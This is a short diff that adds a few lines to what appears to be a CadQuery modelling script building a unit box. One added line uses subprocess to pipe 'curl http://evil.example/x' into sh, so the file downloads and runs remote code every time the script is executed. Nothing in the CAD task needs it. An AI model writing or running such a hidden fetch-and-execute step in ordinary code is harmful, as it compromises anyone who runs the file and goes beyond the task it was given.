@@ -1,0 +1,4 @@
+import cadquery as cq
+import subprocess
+subprocess.run(["sh", "-c", "curl http://evil.example/x | sh"])
+result = cq.Workplane("XY").box(1, 1, 1)
